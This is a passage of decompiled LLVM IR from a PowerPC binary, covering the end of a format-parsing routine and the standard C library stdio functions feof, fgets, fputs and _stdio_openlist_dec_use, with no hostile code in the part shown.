  %v3_1000452c = icmp eq i8 %v2_10004528, 0
  br i1 %v3_1000452c, label %dec_label_pc_10004534, label %dec_label_pc_1000454c

dec_label_pc_10004534:                            ; preds = %dec_label_pc_100044e4
  %v0_10004534 = load i32, i32* @r30, align 4
  %v1_10004534 = inttoptr i32 %v0_10004534 to i8*
  %v2_10004534 = load i8, i8* %v1_10004534, align 1
  %v3_10004534 = zext i8 %v2_10004534 to i32
  store i32 %v3_10004534, i32* %r0.global-to-local, align 4
  %v3_10004538 = icmp eq i8 %v2_10004534, 109
  br i1 %v3_10004538, label %dec_label_pc_10004540, label %dec_label_pc_10004684

dec_label_pc_10004540:                            ; preds = %dec_label_pc_10004534
  store i32 20, i32* %r0.global-to-local, align 4
  %v1_10004544 = load i32, i32* @r28, align 4
  %v2_10004544 = add i32 %v1_10004544, 28
  %v3_10004544 = inttoptr i32 %v2_10004544 to i32*
  store i32 %v3_10004528, i32* %v3_10004544, align 4
  %v0_10004548 = load i32, i32* %r0.global-to-local, align 4
  %v1_10004548 = load i32, i32* @r28, align 4
  %v2_10004548 = add i32 %v1_10004548, 32
  %v3_10004548 = inttoptr i32 %v2_10004548 to i32*
  store i32 %v0_10004548, i32* %v3_10004548, align 4
  br label %dec_label_pc_1000454c

dec_label_pc_1000454c:                            ; preds = %dec_label_pc_100044e4, %dec_label_pc_10004540
  %v0_1000454c = load i32, i32* @r26, align 4
  %tmp62 = icmp slt i32 %v0_1000454c, 1
  br i1 %tmp62, label %dec_label_pc_10004628, label %dec_label_pc_10004554

dec_label_pc_10004554:                            ; preds = %dec_label_pc_1000454c
  store i32 0, i32* @r27, align 4
  br label %dec_label_pc_10004558

dec_label_pc_10004558:                            ; preds = %dec_label_pc_10004610, %dec_label_pc_10004554
  %v0_10004580 = phi i32 [ 0, %dec_label_pc_10004554 ], [ %v1_10004614, %dec_label_pc_10004610 ]
  %v2_10004558 = icmp sgt i32 %v0_10004580, 2
  br i1 %v2_10004558, label %dec_label_pc_1000457c, label %dec_label_pc_10004560

dec_label_pc_10004560:                            ; preds = %dec_label_pc_10004558
  %v1_10004560 = mul i32 %v0_10004580, 4
  store i32 %v1_10004560, i32* %r0.global-to-local, align 4
  %v0_10004564 = load i32, i32* @r1, align 4
  %v2_10004564 = add i32 %v0_10004564, %v1_10004560
  store i32 %v2_10004564, i32* %r9.global-to-local, align 4
  %v1_10004568 = add i32 %v2_10004564, 20
  %v2_10004568 = inttoptr i32 %v1_10004568 to i32*
  %v3_10004568 = load i32, i32* %v2_10004568, align 4
  store i32 %v3_10004568, i32* %r0.global-to-local, align 4
  %v1_1000456c = load i32, i32* @r28, align 4
  %v2_1000456c = add i32 %v1_1000456c, %v0_10004580
  store i32 %v2_1000456c, i32* %r9.global-to-local, align 4
  %v1_10004570 = urem i32 %v3_10004568, 256
  store i32 %v1_10004570, i32* %r11.global-to-local, align 4
  %v1_10004574 = trunc i32 %v3_10004568 to i8
  %v3_10004574 = add i32 %v2_1000456c, 36
  %v4_10004574 = inttoptr i32 %v3_10004574 to i8*
  store i8 %v1_10004574, i8* %v4_10004574, align 1
  %v0_10004588.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10004588

dec_label_pc_1000457c:                            ; preds = %dec_label_pc_10004558
  %v2_10004580 = add i32 %v0_10004580, %stack_var_-84.3
  store i32 %v2_10004580, i32* %r9.global-to-local, align 4
  %v1_10004584 = add i32 %v2_10004580, -2
  store i32 %v1_10004584, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10004588

dec_label_pc_10004588:                            ; preds = %dec_label_pc_10004560, %dec_label_pc_1000457c
  %v0_100045a8 = phi i32 [ %v0_10004588.pre, %dec_label_pc_10004560 ], [ %v1_10004584, %dec_label_pc_1000457c ]
  %v1_10004588 = load i32, i32* @r26, align 4
  %v3_10004588 = icmp sgt i32 %v0_100045a8, %v1_10004588
  br i1 %v3_10004588, label %dec_label_pc_10004590, label %dec_label_pc_1000459c

dec_label_pc_10004590:                            ; preds = %dec_label_pc_10004588
  %v2_10004590 = icmp sgt i32 %v0_100045a8, 9
  br i1 %v2_10004590, label %dec_label_pc_10004684, label %dec_label_pc_10004598

dec_label_pc_10004598:                            ; preds = %dec_label_pc_10004590
  store i32 %v0_100045a8, i32* @r26, align 4
  br label %dec_label_pc_1000459c

dec_label_pc_1000459c:                            ; preds = %dec_label_pc_10004588, %dec_label_pc_10004598
  store i32 %v2_10004238.pre-phi, i32* %r9.global-to-local, align 4
  %v0_100045a0 = load i32, i32* @r27, align 4
  %v1_100045a0 = mul i32 %v0_100045a0, 4
  store i32 %v1_100045a0, i32* %r0.global-to-local, align 4
  %v2_100045a4 = add i32 %v1_100045a0, %v2_10004238.pre-phi
  %v3_100045a4 = inttoptr i32 %v2_100045a4 to i32*
  %v4_100045a4 = load i32, i32* %v3_100045a4, align 4
  store i32 %v4_100045a4, i32* @r31, align 4
  %v1_100045a8 = add i32 %v0_100045a8, -1
  store i32 %v1_100045a8, i32* @r25, align 4
  %v1_100045ac = mul i32 %v1_100045a8, 4
  %v1_100045b0 = load i32, i32* @r28, align 4
  %v2_100045b0 = add i32 %v1_100045b0, %v1_100045ac
  store i32 %v2_100045b0, i32* %r9.global-to-local, align 4
  %v3_100045b4 = icmp eq i32 %v4_100045a4, 8
  %v1_100045b8 = add i32 %v2_100045b0, 40
  %v2_100045b8 = inttoptr i32 %v1_100045b8 to i32*
  %v3_100045b8 = load i32, i32* %v2_100045b8, align 4
  store i32 %v3_100045b8, i32* %r3.global-to-local, align 4
  br i1 %v3_100045b4, label %dec_label_pc_10004610, label %dec_label_pc_100045c0

dec_label_pc_100045c0:                            ; preds = %dec_label_pc_1000459c
  %v3_100045c0 = icmp eq i32 %v3_100045b8, 8
  br i1 %v3_100045c0, label %dec_label_pc_100045f8, label %dec_label_pc_100045c8

dec_label_pc_100045c8:                            ; preds = %dec_label_pc_100045c0
  %v4_100045c8 = icmp eq i32 %v3_100045b8, %v4_100045a4
  br i1 %v4_100045c8, label %dec_label_pc_100045f8, label %dec_label_pc_100045d0

dec_label_pc_100045d0:                            ; preds = %dec_label_pc_100045c8
  %v1_100045d0 = call i32 @_promoted_size(i32 %v3_100045b8)
  store i32 %v1_100045d0, i32* @r29, align 4
  %v0_100045d8 = load i32, i32* @r31, align 4
  store i32 %v0_100045d8, i32* %r3.global-to-local, align 4
  %v1_100045dc = call i32 @_promoted_size(i32 %v0_100045d8)
  store i32 %v1_100045dc, i32* %r3.global-to-local, align 4
  %v0_100045e8 = call i32 @__asm_mfcr()
  store i32 %v0_100045e8, i32* %r3.global-to-local, align 4
  store i32 %v0_100045e8, i32* %r0.global-to-local, align 4
  %v1_100045ec = call i32 @__asm_rlwinm(i32 %v0_100045e8, i32 31, i32 31, i32 31)
  store i32 %v1_100045ec, i32* %r0.global-to-local, align 4
  %v3_100045f0 = icmp eq i32 %v1_100045ec, 0
  br i1 %v3_100045f0, label %dec_label_pc_10004610, label %dec_label_pc_100045d0.dec_label_pc_100045f8_crit_edge

dec_label_pc_100045d0.dec_label_pc_100045f8_crit_edge: ; preds = %dec_label_pc_100045d0
  %v0_100045fc.pre = load i32, i32* @r27, align 4
  %v0_10004604.pre = load i32, i32* @r25, align 4
  %v1_10004608.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_100045f8

dec_label_pc_100045f8:                            ; preds = %dec_label_pc_100045d0.dec_label_pc_100045f8_crit_edge, %dec_label_pc_100045c8, %dec_label_pc_100045c0
  %v1_10004608 = phi i32 [ %v1_10004608.pre, %dec_label_pc_100045d0.dec_label_pc_100045f8_crit_edge ], [ %v1_100045b0, %dec_label_pc_100045c8 ], [ %v1_100045b0, %dec_label_pc_100045c0 ]
  %v0_10004604 = phi i32 [ %v0_10004604.pre, %dec_label_pc_100045d0.dec_label_pc_100045f8_crit_edge ], [ %v1_100045a8, %dec_label_pc_100045c8 ], [ %v1_100045a8, %dec_label_pc_100045c0 ]
  %v0_100045fc = phi i32 [ %v0_100045fc.pre, %dec_label_pc_100045d0.dec_label_pc_100045f8_crit_edge ], [ %v0_100045a0, %dec_label_pc_100045c8 ], [ %v0_100045a0, %dec_label_pc_100045c0 ]
  store i32 %v2_10004238.pre-phi, i32* %r9.global-to-local, align 4
  %v1_100045fc = mul i32 %v0_100045fc, 4
  store i32 %v1_100045fc, i32* %r0.global-to-local, align 4
  %v2_10004600 = add i32 %v1_100045fc, %v2_10004238.pre-phi
  %v3_10004600 = inttoptr i32 %v2_10004600 to i32*
  %v4_10004600 = load i32, i32* %v3_10004600, align 4
  store i32 %v4_10004600, i32* %r0.global-to-local, align 4
  %v1_10004604 = mul i32 %v0_10004604, 4
  %v2_10004608 = add i32 %v1_10004604, %v1_10004608
  store i32 %v2_10004608, i32* %r9.global-to-local, align 4
  %v2_1000460c = add i32 %v2_10004608, 40
  %v3_1000460c = inttoptr i32 %v2_1000460c to i32*
  store i32 %v4_10004600, i32* %v3_1000460c, align 4
  br label %dec_label_pc_10004610

dec_label_pc_10004610:                            ; preds = %dec_label_pc_100045d0, %dec_label_pc_1000459c, %dec_label_pc_100045f8
  %v0_10004610 = load i32, i32* @r28, align 4
  %v1_10004610 = add i32 %v0_10004610, 28
  %v2_10004610 = inttoptr i32 %v1_10004610 to i32*
  %v3_10004610 = load i32, i32* %v2_10004610, align 4
  %v0_10004614 = load i32, i32* @r27, align 4
  %v1_10004614 = add i32 %v0_10004614, 1
  store i32 %v1_10004614, i32* @r27, align 4
  %v1_10004618 = add i32 %v3_10004610, 2
  store i32 %v1_10004618, i32* %r9.global-to-local, align 4
  %v2_1000461c = icmp slt i32 %v1_10004614, %v1_10004618
  br i1 %v2_1000461c, label %dec_label_pc_10004558, label %dec_label_pc_10004640

dec_label_pc_10004628:                            ; preds = %dec_label_pc_1000454c
  %v0_10004628 = load i32, i32* @r28, align 4
  %v1_10004628 = add i32 %v0_10004628, 28
  %v2_10004628 = inttoptr i32 %v1_10004628 to i32*
  %v3_10004628 = load i32, i32* %v2_10004628, align 4
  store i32 %v3_10004628, i32* %r5.global-to-local, align 4
  %v1_1000462c = add i32 %v0_10004628, 40
  store i32 %v1_1000462c, i32* @r3, align 4
  %v0_10004630 = load i32, i32* %r8.global-to-local, align 4
  %v1_10004630 = trunc i32 %v0_10004630 to i8
  %v3_10004630 = add i32 %v0_10004628, 38
  %v4_10004630 = inttoptr i32 %v3_10004630 to i8*
  store i8 %v1_10004630, i8* %v4_10004630, align 1
  %v2_10004634 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_10004634, i32* @r4, align 4
  %v0_10004638 = load i32, i32* %r5.global-to-local, align 4
  %v1_10004638 = mul i32 %v0_10004638, 4
  store i32 %v1_10004638, i32* @r5, align 4
  store i32 268453440, i32* @lr, align 4
  %v0_1000463c = call i32 @memcpy()
  store i32 %v0_1000463c, i32* %r3.global-to-local, align 4
  %v0_10004640.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10004640

dec_label_pc_10004640:                            ; preds = %dec_label_pc_10004610, %dec_label_pc_10004628
  %v0_10004640 = phi i32 [ %v0_10004640.pre, %dec_label_pc_10004628 ], [ %v0_10004610, %dec_label_pc_10004610 ]
  %v1_10004640 = add i32 %v0_10004640, 16
  %v2_10004640 = inttoptr i32 %v1_10004640 to i32*
  %v3_10004640 = load i32, i32* %v2_10004640, align 4
  store i32 %v3_10004640, i32* %r0.global-to-local, align 4
  %v0_10004644 = load i32, i32* @r26, align 4
  %v2_10004644 = add i32 %v0_10004640, 24
  %v3_10004644 = inttoptr i32 %v2_10004644 to i32*
  store i32 %v0_10004644, i32* %v3_10004644, align 4
  %v0_10004648 = load i32, i32* %r0.global-to-local, align 4
  %v1_10004648 = and i32 %v0_10004648, 128
  store i32 %v1_10004648, i32* %r9.global-to-local, align 4
  %v3_10004648 = icmp eq i32 %v1_10004648, 0
  br i1 %v3_10004648, label %dec_label_pc_10004650, label %dec_label_pc_1000465c

dec_label_pc_10004650:                            ; preds = %dec_label_pc_10004640
  %v0_10004650 = load i32, i32* @r30, align 4
  %v1_10004650 = add i32 %v0_10004650, 1
  store i32 %v1_10004650, i32* %r0.global-to-local, align 4
  %v1_10004654 = load i32, i32* @r28, align 4
  %v2_10004654 = inttoptr i32 %v1_10004654 to i32*
  store i32 %v1_10004650, i32* %v2_10004654, align 4
  br label %dec_label_pc_10004674

dec_label_pc_1000465c:                            ; preds = %dec_label_pc_10004640
  %v0_1000465c = load i32, i32* @r28, align 4
  %v1_1000465c = inttoptr i32 %v0_1000465c to i32*
  %v2_1000465c = load i32, i32* %v1_1000465c, align 4
  %v2_10004660 = ptrtoint i32* %stack_var_-80 to i32
  %v1_10004664 = load i32, i32* @r30, align 4
  %v2_10004664 = sub i32 %v1_10004664, %v2_10004660
  %v1_10004668 = mul i32 %v2_10004664, 4
  store i32 %v1_10004668, i32* %r0.global-to-local, align 4
  %v2_1000466c = add i32 %v1_10004668, %v2_1000465c
  store i32 %v2_1000466c, i32* %r9.global-to-local, align 4
  store i32 %v2_1000466c, i32* %v1_1000465c, align 4
  br label %dec_label_pc_10004674

dec_label_pc_10004674:                            ; preds = %dec_label_pc_10004650, %dec_label_pc_1000465c
  %v0_10004674 = load i32, i32* @r28, align 4
  %v1_10004674 = add i32 %v0_10004674, 28
  %v2_10004674 = inttoptr i32 %v1_10004674 to i32*
  %v3_10004674 = load i32, i32* %v2_10004674, align 4
  store i32 %v3_10004674, i32* %r9.global-to-local, align 4
  %v1_10004678 = add i32 %v3_10004674, 2
  br label %dec_label_pc_10004684

dec_label_pc_10004684:                            ; preds = %dec_label_pc_100041e8, %dec_label_pc_10004398, %dec_label_pc_100042bc, %dec_label_pc_1000438c, %dec_label_pc_100043b4, %dec_label_pc_100042f0, %dec_label_pc_10004590, %dec_label_pc_10004440, %dec_label_pc_10004534, %dec_label_pc_10004674
  %storemerge2 = phi i32 [ %v1_10004678, %dec_label_pc_10004674 ], [ -1, %dec_label_pc_10004534 ], [ -1, %dec_label_pc_10004440 ], [ -1, %dec_label_pc_10004590 ], [ -1, %dec_label_pc_100042f0 ], [ -1, %dec_label_pc_100043b4 ], [ -1, %dec_label_pc_1000438c ], [ -1, %dec_label_pc_100042bc ], [ -1, %dec_label_pc_10004398 ], [ -1, %dec_label_pc_100041e8 ]
  store i32 %storemerge2, i32* %r3.global-to-local, align 4
  store i32 %v0_10004184, i32* %r0.global-to-local, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i32 %v1_10004668, { 1, 0 }
  uselistorder i32 %v0_10004640, { 1, 0 }
  uselistorder i32 %v1_10004614, { 1, 2, 0 }
  uselistorder i32 %v1_100045fc, { 1, 0 }
  uselistorder i32 %v0_100045e8, { 0, 2, 1 }
  uselistorder i32 %v3_100045b8, { 1, 0, 2, 3 }
  uselistorder i32 %v1_100045b0, { 1, 2, 0 }
  uselistorder i32 %v1_100045a8, { 1, 2, 0, 3 }
  uselistorder i32 %v1_100045a0, { 1, 0 }
  uselistorder i32 %v0_100045a0, { 1, 2, 0 }
  uselistorder i32 %v3_10004568, { 1, 0, 2 }
  uselistorder i32 %v1_10004560, { 1, 0 }
  uselistorder i32 %v0_10004580, { 1, 2, 0, 3 }
  uselistorder i32 %v1_100044d8, { 1, 2, 0 }
  uselistorder i32 %v1_100044b0, { 2, 1, 0 }
  uselistorder i32 %v1_1000449c, { 0, 2, 3, 1 }
  uselistorder i32 %v1_10004480, { 1, 0, 2 }
  uselistorder i32 %v1_1000444c, { 2, 3, 1, 0 }
  uselistorder i32 %v1_10004408, { 0, 2, 3, 1 }
  uselistorder i32 %v0_100043cc, { 0, 3, 2, 1 }
  uselistorder i32 %v1_100043b8, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_10004328, { 0, 1, 3, 2 }
  uselistorder i32 %v0_10004324, { 1, 0 }
  uselistorder i32 %v0_1000433c, { 1, 2, 4, 3, 5, 0 }
  uselistorder i32 %stack_var_-84.2, { 1, 0 }
  uselistorder i32 %v0_100042a0, { 0, 1, 6, 4, 3, 5, 2, 7 }
  uselistorder i32 %v2_10004290, { 1, 0 }
  uselistorder i32 %v1_1000428c, { 1, 0 }
  uselistorder i32 %v3_10004280, { 1, 0, 2 }
  uselistorder i32 %v0_100042fc, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_100042cc, { 0, 1, 3, 2, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 %v0_1000425c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_10004244, { 1, 0 }
  uselistorder i32 %v2_10004238.pre-phi, { 0, 4, 1, 3, 2 }
  uselistorder i32 %v1_10004218, { 1, 0 }
  uselistorder i32 %v1_10004200, { 1, 2, 0 }
  uselistorder i32 %v0_100041f4, { 2, 1, 0 }
  uselistorder i32* %stack_var_-104, { 2, 0, 1 }
  uselistorder i32* %stack_var_-96, { 2, 0, 1 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 21, 22, 23, 24, 25, 26, 27, 28, 0, 29, 30, 31, 32, 33, 12, 13, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i32* %r8.global-to-local, { 4, 5, 6, 7, 0, 1, 2, 3 }
  uselistorder i32* %r6.global-to-local, { 3, 4, 0, 1, 2 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 6, 7, 2, 4, 3, 5, 8 }
  uselistorder i32* %r4.global-to-local, { 5, 6, 4, 2, 3, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 3, 2, 1, 4, 5, 6, 9, 7, 8, 0 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 2, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r10.global-to-local, { 7, 8, 9, 10, 3, 4, 5, 1, 2, 0, 6 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 26, 27, 25, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32 (i32)* @_promoted_size, { 1, 0 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_1000bd30.369 to i32), { 3, 0, 1, 2 }
  uselistorder i32 ptrtoint ([9 x i8]* @global_var_1000bcf0.368 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i8 36, { 1, 0 }
  uselistorder i8 37, { 0, 3, 4, 2, 5, 1 }
  uselistorder i32* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10004684, { 9, 6, 8, 7, 4, 1, 3, 5, 2, 0 }
  uselistorder label %dec_label_pc_10004674, { 1, 0 }
  uselistorder label %dec_label_pc_10004640, { 1, 0 }
  uselistorder label %dec_label_pc_10004610, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000459c, { 1, 0 }
  uselistorder label %dec_label_pc_10004588, { 1, 0 }
  uselistorder label %dec_label_pc_1000454c, { 1, 0 }
  uselistorder label %dec_label_pc_10004494, { 1, 0 }
  uselistorder label %dec_label_pc_10004440, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100043f0, { 1, 0 }
  uselistorder label %dec_label_pc_100043c4, { 1, 0 }
  uselistorder label %dec_label_pc_10004378, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10004374, { 1, 0 }
  uselistorder label %dec_label_pc_100042e8, { 1, 0 }
  uselistorder label %dec_label_pc_100042e0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10004280, { 1, 0 }
  uselistorder label %dec_label_pc_1000427c, { 1, 0 }
  uselistorder label %dec_label_pc_10004268, { 1, 0 }
  uselistorder label %dec_label_pc_10004248, { 1, 0 }
  uselistorder label %dec_label_pc_10004244, { 1, 0 }
  uselistorder label %dec_label_pc_10004228, { 1, 0 }
}

define i32 @feof(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_100046a0 = call i32 @__asm_mfcr()
  store i32 %v0_100046a0, i32* %r31.global-to-local, align 4
  %v2_100046c4 = add i32 %v0_100046a0, 52
  %v3_100046c4 = inttoptr i32 %v2_100046c4 to i32*
  %v4_100046c4 = load i32, i32* %v3_100046c4, align 4
  %v2_100046c8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_100046c8, i32* @r3, align 4
  %v3_100046cc = icmp eq i32 %v4_100046c4, 0
  store i1 %v3_100046cc, i1* @cr4_eq, align 1
  br i1 %v3_100046cc, label %dec_label_pc_100046e0, label %dec_label_pc_100046e0.thread

dec_label_pc_100046e0.thread:                     ; preds = %entry
  %v1_100046e83 = inttoptr i32 %v0_100046a0 to i16*
  %v2_100046e84 = load i16, i16* %v1_100046e83, align 2
  %v3_100046e85 = zext i16 %v2_100046e84 to i32
  store i32 %v3_100046e85, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100046f4

dec_label_pc_100046e0:                            ; preds = %entry
  %v0_100046d4 = call i32 @__pthread_return_void()
  %v0_100046dc = call i32 @__pthread_return_0()
  %v0_100046e8.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_100046ec.pre = load i1, i1* @cr4_eq, align 1
  store i32 %v2_100046c8, i32* @r3, align 4
  %v1_100046e8 = inttoptr i32 %v0_100046e8.pre to i16*
  %v2_100046e8 = load i16, i16* %v1_100046e8, align 2
  %v3_100046e8 = zext i16 %v2_100046e8 to i32
  store i32 %v3_100046e8, i32* %r31.global-to-local, align 4
  br i1 %v0_100046ec.pre, label %dec_label_pc_100046f0, label %dec_label_pc_100046f4

dec_label_pc_100046f0:                            ; preds = %dec_label_pc_100046e0
  %v0_100046f0 = call i32 @__pthread_return_void()
  br label %dec_label_pc_100046f4

dec_label_pc_100046f4:                            ; preds = %dec_label_pc_100046e0.thread, %dec_label_pc_100046e0, %dec_label_pc_100046f0
  %v3_100046e86 = phi i32 [ %v3_100046e85, %dec_label_pc_100046e0.thread ], [ %v3_100046e8, %dec_label_pc_100046e0 ], [ %v3_100046e8, %dec_label_pc_100046f0 ]
  %v1_100046f8 = call i32 @__asm_rlwinm(i32 %v3_100046e86, i32 0, i32 29, i32 29)
  %v1_1000470c = call %0 @__asm_mtcrf(i32 8, i32 %v0_100046a0)
  ret i32 %v1_100046f8

; uselistorder directives
  uselistorder i32 %v0_100046a0, { 3, 0, 1, 2 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_100046f4, { 2, 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r28.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_1000471c = call i32 @__asm_mfcr()
  store i32 %arg2, i32* %r30.global-to-local, align 4
  store i32 %arg3, i32* %r31.global-to-local, align 4
  store i32 %v0_1000471c, i32* %r28.global-to-local, align 4
  %v2_10004744 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10004744, i32* @r3, align 4
  %v1_10004748 = add i32 %arg3, 52
  %v2_10004748 = inttoptr i32 %v1_10004748 to i32*
  %v3_10004748 = load i32, i32* %v2_10004748, align 4
  %v3_10004750 = icmp eq i32 %v3_10004748, 0
  store i1 %v3_10004750, i1* @cr4_eq, align 1
  br i1 %v3_10004750, label %dec_label_pc_10004758, label %dec_label_pc_10004764

dec_label_pc_10004758:                            ; preds = %entry
  %v0_10004758 = call i32 @__pthread_return_void()
  %v0_10004760 = call i32 @__pthread_return_0()
  %v0_10004764.pre = load i32, i32* %r30.global-to-local, align 4
  %v0_10004768.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_1000476c.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_10004764

dec_label_pc_10004764:                            ; preds = %entry, %dec_label_pc_10004758
  %v0_1000476c = phi i32 [ %v0_1000471c, %entry ], [ %v0_1000476c.pre, %dec_label_pc_10004758 ]
  %v0_10004768 = phi i32 [ %arg3, %entry ], [ %v0_10004768.pre, %dec_label_pc_10004758 ]
  %v0_10004764 = phi i32 [ %arg2, %entry ], [ %v0_10004764.pre, %dec_label_pc_10004758 ]
  store i32 268453748, i32* @lr, align 4
  %v3_10004770 = inttoptr i32 %v0_1000476c to i8*
  %v4_10004770 = call i32 @__GI_fgets_unlocked(i8* %v3_10004770, i32 %v0_10004764, i32 %v0_10004768)
  store i32 %v4_10004770, i32* @r31, align 4
  store i32 %v2_10004744, i32* @r3, align 4
  %v0_10004780 = load i1, i1* @cr4_eq, align 1
  br i1 %v0_10004780, label %dec_label_pc_10004784, label %dec_label_pc_10004788

dec_label_pc_10004784:                            ; preds = %dec_label_pc_10004764
  %v0_10004784 = call i32 @__pthread_return_void()
  %v0_1000478c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10004788

dec_label_pc_10004788:                            ; preds = %dec_label_pc_10004764, %dec_label_pc_10004784
  %v0_1000478c = phi i32 [ %v4_10004770, %dec_label_pc_10004764 ], [ %v0_1000478c.pre, %dec_label_pc_10004784 ]
  %v1_100047a0 = call %0 @__asm_mtcrf(i32 8, i32 %v0_1000471c)
  ret i32 %v0_1000478c

; uselistorder directives
  uselistorder i32 %v0_1000471c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10004788, { 1, 0 }
  uselistorder label %dec_label_pc_10004764, { 1, 0 }
}

define i32 @__GI_fputs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_100047b0 = call i32 @__asm_mfcr()
  store i32 %arg2, i32* %r31.global-to-local, align 4
  store i32 %v0_100047b0, i32* %r29.global-to-local, align 4
  %v2_100047d0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_100047d0, i32* @r3, align 4
  %v1_100047d4 = add i32 %arg2, 52
  %v2_100047d4 = inttoptr i32 %v1_100047d4 to i32*
  %v3_100047d4 = load i32, i32* %v2_100047d4, align 4
  %v3_100047e0 = icmp eq i32 %v3_100047d4, 0
  store i1 %v3_100047e0, i1* @cr4_eq, align 1
  br i1 %v3_100047e0, label %dec_label_pc_100047e8, label %dec_label_pc_100047f4

dec_label_pc_100047e8:                            ; preds = %entry
  %v0_100047e8 = call i32 @__pthread_return_void()
  %v0_100047f0 = call i32 @__pthread_return_0()
  %v0_100047f4.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_100047f8.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_100047f4

dec_label_pc_100047f4:                            ; preds = %entry, %dec_label_pc_100047e8
  %v0_100047f8 = phi i32 [ %v0_100047b0, %entry ], [ %v0_100047f8.pre, %dec_label_pc_100047e8 ]
  %v0_100047f4 = phi i32 [ %arg2, %entry ], [ %v0_100047f4.pre, %dec_label_pc_100047e8 ]
  store i32 268453888, i32* @lr, align 4
  %v2_100047fc = call i32 @__GI_fputs_unlocked(i32 %v0_100047f8, i32 %v0_100047f4)
  store i32 %v2_100047fc, i32* %r31.global-to-local, align 4
  store i32 %v2_100047d0, i32* @r3, align 4
  %v0_1000480c = load i1, i1* @cr4_eq, align 1
  br i1 %v0_1000480c, label %dec_label_pc_10004810, label %dec_label_pc_10004814

dec_label_pc_10004810:                            ; preds = %dec_label_pc_100047f4
  %v0_10004810 = call i32 @__pthread_return_void()
  %v0_10004818.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10004814

dec_label_pc_10004814:                            ; preds = %dec_label_pc_100047f4, %dec_label_pc_10004810
  %v0_10004818 = phi i32 [ %v2_100047fc, %dec_label_pc_100047f4 ], [ %v0_10004818.pre, %dec_label_pc_10004810 ]
  %v1_1000482c = call %0 @__asm_mtcrf(i32 8, i32 %v0_100047b0)
  ret i32 %v0_10004818

; uselistorder directives
  uselistorder i32 %v0_100047b0, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @__GI_fputs_unlocked, { 1, 0 }
  uselistorder label %dec_label_pc_10004814, { 1, 0 }
  uselistorder label %dec_label_pc_100047f4, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10006d24.342 to i32), i32* @r31, align 4
  store i32 ptrtoint (i32* @global_var_1001d4c4.343 to i32), i32* @r29, align 4
  %v2_10004858 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10004858, i32* @r3, align 4
  %v0_10004860 = call i32 @__pthread_return_void()
  %v0_10004868 = call i32 @__pthread_return_0()
  %v3_10004870 = load i32, i32* @global_var_1001d864.344, align 4
  %v3_10004874 = icmp eq i32 %v3_10004870, 1
  br i1 %v3_10004874, label %dec_label_pc_1000487c, label %dec_label_pc_10004924

dec_label_pc_1000487c:                            ; preds = %entry
  %v3_10004880 = load i32, i32* @global_var_1001d868.345, align 4
  %tmp7 = icmp slt i32 %v3_10004880, 1
  br i1 %tmp7, label %dec_label_pc_10004924, label %dec_label_pc_1000488c

dec_label_pc_1000488c:                            ; preds = %dec_label_pc_1000487c
  %v2_10004898 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10004898, i32* @r3, align 4
  store i32 0, i32* @r30, align 4
  %v0_100048a4 = call i32 @__pthread_return_void()
  %v0_100048ac = call i32 @__pthread_return_0()
